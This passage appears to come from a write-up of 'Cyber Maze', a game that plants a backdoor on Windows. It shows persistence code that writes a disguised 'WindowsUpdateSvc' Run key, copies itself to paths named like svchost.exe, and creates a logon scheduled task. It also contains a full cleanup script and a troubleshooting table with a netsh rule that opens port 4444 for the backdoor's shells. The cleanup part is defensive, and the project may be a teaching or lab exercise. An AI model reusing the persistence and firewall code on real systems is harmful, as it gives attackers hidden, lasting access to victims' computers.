        except:

5.1 Two-Level Persistence

Level 1: Game Closure Survival

  • Persistent shell runs as SEPARATE process (WindowsUpdate.exe)

  • Auto-reconnects every 5-10 seconds if connection drops

Level 2: Reboot Survival

def add_to_startup():
    """Add to multiple startup locations to survive reboots"""
    
    # 1. Registry Run Key (runs at user login)
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
        winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe_path}"')
    
    # 2. Copy to multiple hidden locations
    locations = [
        os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Caches\\svchost.exe"),
        os.path.expanduser("~\\AppData\\Local\\Temp\\winupdate.exe"),
        "C:\\ProgramData\\Microsoft\\Windows\\Caches\\winservice.exe"
    ]
    
    # 3. Scheduled Task (most reliable)
    task_name = "WindowsUpdateTask"
    subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /f', shell=True)

#!/usr/bin/env python3
"""
Cyber Maze - Complete Cleanup Tool
Removes ALL traces of the backdoor from the system
"""
import os
import shutil
import winreg
import subprocess
import time

def print_banner():
    print("=" * 70)
    print("🧹 CYBER MAZE - COMPLETE CLEANUP TOOL")
    print("=" * 70)
    print("This tool will remove ALL backdoor components including:")
    print("  • Game and persistent shell executables")
    print("  • Registry persistence entries")
    print("  • Scheduled tasks")
    print("  • Hidden log files")
    print("  • Startup folder entries")
    print("=" * 70)

def kill_processes():
    """Kill all related processes"""
    print("\n[1/6] Killing processes...")
    processes = ["WindowsUpdate.exe", "CyberMaze.exe", "python.exe", "pythonw.exe"]
    for proc in processes:
        result = os.system(f"taskkill /f /im {proc} 2>nul")
        if result == 0:
            print(f"  ✅ Killed: {proc}")
    time.sleep(2)

def remove_registry_entries():
    """Remove persistence from registry"""
    print("\n[2/6] Cleaning registry...")
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            try:
                winreg.DeleteValue(regkey, "WindowsUpdateSvc")
                print("  ✅ Removed: HKCU\\Run\\WindowsUpdateSvc")
            except:
                print("  ℹ️  No registry entry found")
    except Exception as e:
        print(f"  ❌ Registry error: {e}")

def remove_scheduled_tasks():
    """Remove scheduled tasks"""
    print("\n[3/6] Removing scheduled tasks...")
    tasks = ["WindowsUpdateTask", "CyberMazeTask"]
    for task in tasks:
        result = os.system(f'schtasks /delete /tn "{task}" /f 2>nul')
        if result == 0:
            print(f"  ✅ Removed: {task}")
    time.sleep(1)

def delete_files():
    """Delete all backdoor files"""
    print("\n[4/6] Deleting malicious files...")
    
    # Files to delete
    files_to_delete = [
        # Log files
        os.path.expanduser("~\\AppData\\Local\\Temp\\~spoolsv.log"),
        os.path.expanduser("~\\AppData\\Local\\Temp\\~svchost.log"),
        "C:\\Windows\\Temp\\~msupdate.log",
        os.path.expanduser("~\\Desktop\\attacker_activity.log"),
        os.path.join(os.environ.get('TEMP', 'C:\\Temp'), '~spoolsv.log'),
        
        # Executables
        os.path.expanduser("~\\AppData\\Local\\Temp\\winupdate.exe"),
        os.path.expanduser("~\\AppData\\Local\\Temp\\WindowsUpdate.exe"),
        os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Caches\\svchost.exe"),
        "C:\\ProgramData\\Microsoft\\Windows\\Caches\\winservice.exe",
        "C:\\WindowsUpdate.exe",
        
        # Scripts
        os.path.expanduser("~\\AppData\\Local\\Temp\\winsvc.py"),
        os.path.expanduser("~\\AppData\\Local\\Temp\\winsvc.vbs"),
        os.path.expanduser("~\\AppData\\Local\\Temp\\winsvc.bat"),
    ]
    
    # Also search for any copies
    search_paths = [
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Documents"),
        os.environ.get('TEMP', 'C:\\Temp'),
    ]
    
    for file_path in files_to_delete:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
                print(f"  ✅ Deleted: {os.path.basename(file_path)}")
        except:
            pass
    
    print("  ✅ File cleanup complete")

def remove_startup_folder():
    """Remove from startup folder"""
    print("\n[5/6] Cleaning startup folder...")
    startup = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    startup_files = ["WindowsUpdate.exe", "svchost.exe", "CyberMaze.exe"]
    
    for file in startup_files:
        file_path = os.path.join(startup, file)
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                print(f"  ✅ Removed from startup: {file}")
            except:
                pass

def final_scan():
    """Final scan for any remaining traces"""
    print("\n[6/6] Performing final scan...")
    suspicious = []
    
    # Check running processes
    proc_check = os.popen('tasklist | findstr /i "update svchost python"').read()
    if proc_check:
        suspicious.append("Suspicious processes found")
    
    # Check registry
    reg_check = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | findstr /i "update svc"').read()
    if reg_check:
        suspicious.append("Suspicious registry entries found")
    
    if not suspicious:
        print("  ✅ System is clean! No traces found.")
    else:
        print("  ⚠️  Warning: Some traces may remain:")
        for item in suspicious:
            print(f"     • {item}")

Appendix C: Troubleshooting Guide

Problem Solution
No shells appear Check firewall: netsh advfirewall firewall add rule name="Backdoor" dir=in action=allow protocol=TCP localport=4444
Only game shells, no persistent Ensure WindowsUpdate.exe is in same folder as CyberMaze.exe
Shell disconnects after one command Update client to use Popen instead of check_output for large outputs
Can't build EXE Run as Administrator, clean build folder, use --distpath to different location
No logs found Check %TEMP%, C:\Windows\Temp, and desktop for log files
